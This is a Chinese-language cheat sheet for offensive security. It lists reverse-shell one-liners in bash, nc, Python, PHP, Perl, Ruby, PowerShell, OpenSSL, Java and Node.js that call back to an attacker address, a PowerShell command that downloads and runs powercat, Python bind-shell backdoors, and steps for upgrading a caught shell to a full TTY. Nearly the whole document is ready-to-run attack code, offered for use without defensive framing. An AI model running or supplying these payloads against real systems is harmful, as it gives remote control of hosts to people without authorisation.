# Shell 建立与交互升级速查

## 0x01 概述

本篇记录三类场景：

- 反弹 Shell
- 正向 Shell
- 升级为可交互 TTY

示例中默认回连地址为 `192.168.1.1`，监听端口为 `7777` 或 `8888`，实际使用时替换为自己的地址。

## 0x02 反弹 Shell

### 1. Linux

#### `bash`

```bash
/bin/bash -i >& /dev/tcp/192.168.1.1/7777 0>&1
```

#### `nc`

```bash
nc -e /bin/bash 192.168.1.1 7777
```

#### `python`

可直接脚本执行，也可以通过 `python -c` 单行触发。

```python
import os
os.system("bash -c 'bash -i >& /dev/tcp/192.168.1.1/7777 0>&1'")
```

```python
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.1", 7777))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash", "-i"])
```

### 2. Windows

#### `powercat`

地址：

- https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1

```powershell
powershell -nop -exec bypass -c "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 192.168.1.1 -p 9999 -e cmd.exe"
```

### 3. 更多语言反弹 Shell

#### `php`

```bash
php -r '$sock=fsockopen("192.168.1.1",7777);exec("/bin/sh -i <&3 >&3 2>&3");'
```

#### `perl`

```bash
perl -e 'use Socket;$i="192.168.1.1";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### `ruby`

```bash
ruby -rsocket -e'f=TCPSocket.open("192.168.1.1",7777).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

#### `powershell`

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.1',7777);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII.GetBytes($sendback2));$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### `openssl`（加密反弹，流量过 TLS）

攻击侧先监听：

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 8888
```

目标侧回连：

```bash
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.1.1:8888 > /tmp/s; rm /tmp/s
```

#### `java`

```java
Runtime rt = Runtime.getRuntime();
String[] cmd = {"/bin/bash", "-c", "exec 5<>/dev/tcp/192.168.1.1/7777;cat <&5 | while read line; do $line 2>&5 >&5; done"};
Process p = rt.exec(cmd);
p.waitFor();
```

#### `nodejs`

```js
require('child_process').exec('bash -i >& /dev/tcp/192.168.1.1/7777 0>&1');
```

## 0x03 正向 Shell

以下两个脚本均为 Python 3 语法：`print` 必须带括号、线程守护写法为 `t.daemon = True`、socket 发送需 `bytes`（`msg.encode()`）。

### 1. Python on Windows

监听在 `7777` 端口，可以通过 `nc` 连接：

```python
from socket import *
import subprocess
import threading

def send(talk, proc):
    while True:
        msg = proc.stdout.readline()
        talk.send(msg.encode())

if __name__ == "__main__":
    server = socket(AF_INET, SOCK_STREAM)
    server.bind(("0.0.0.0", 7777))
    server.listen(5)
    print("waiting for connect")
    talk, addr = server.accept()
    print("connect from", addr)
    proc = subprocess.Popen(
        "cmd.exe /K",
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        shell=True
    )
    t = threading.Thread(target=send, args=(talk, proc))
    t.daemon = True
    t.start()
    while True:
        cmd = talk.recv(1024)
        proc.stdin.write(cmd)
        proc.stdin.flush()
```

### 2. Python on Linux

监听在 `7777` 端口，可以通过 `nc` 连接：

```python
from socket import *
import subprocess

if __name__ == "__main__":
    server = socket(AF_INET, SOCK_STREAM)
    server.bind(("0.0.0.0", 7777))
    server.listen(5)
    print("waiting for connect")
    talk, addr = server.accept()
    print("connect from", addr)
    subprocess.Popen(["/bin/sh", "-i"], stdin=talk, stdout=talk, stderr=talk, shell=True)
```

## 0x04 提升交互能力

### 1. `python pty`

把普通 Shell 升级为可交互 TTY：

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

### 2. `script` 升级 TTY

目标上没有 Python 时，用 `script`（util-linux 自带）替代 `pty.spawn`：

```bash
script -qc "/bin/bash" /dev/null
```

配合攻击侧的完整交互流程（与 `python pty.spawn` 互补，第一步两种方式任选其一）：

```bash
# 1. 目标侧：把反弹 shell 升级为 pty
python -c 'import pty; pty.spawn("/bin/bash")'
# 或
script -qc "/bin/bash" /dev/null

# 2. 攻击侧：Ctrl+Z 把 shell 调到后台挂起，再让本地终端进入 raw 模式并关回显
#    注意执行后输入不回显属正常现象，紧接着 fg 回到 shell
stty raw -echo; fg

# 3. 目标侧：补齐终端环境变量与窗口尺寸，即可正常使用 su、vim 等
export TERM=xterm
stty rows 40 columns 120
```

### 3. `socat`

本机监听：

```bash
socat file:`tty`,raw,echo=0 tcp-listen:8888
```

目标主机回连：

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.0.1:8888
```

如果没有安装 `socat`，可以考虑使用静态编译版本：

- https://github.com/andrew-d/static-binaries

## 0x05 排查点

- 目标是否能主动访问你的监听地址。
- 目标是否存在 `bash`、`nc`、`python`、`powershell`。
- 监听端口是否被本机防火墙拦截。
- 回连成功但没有交互时，优先检查 TTY 和标准输入输出绑定。

## 0x06 注意事项

- 正向 Shell 更依赖目标侧开放端口，实战里通常不如反弹 Shell 稳定。
- Windows 下 PowerShell 下载执行很容易被日志和安全软件命中。
- 升级 TTY 后如果还要跑 `su`、`sudo`、文本编辑器，建议再补齐终端环境变量。

## Ref

- [将简单的 Shell 升级为完全交互式 TTY](https://www.4hou.com/posts/mQ7R)
- [Python 正向连接后门](https://www.leavesongs.com/PYTHON/python-shell-backdoor.html)
- [PayloadsAllTheThings - Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
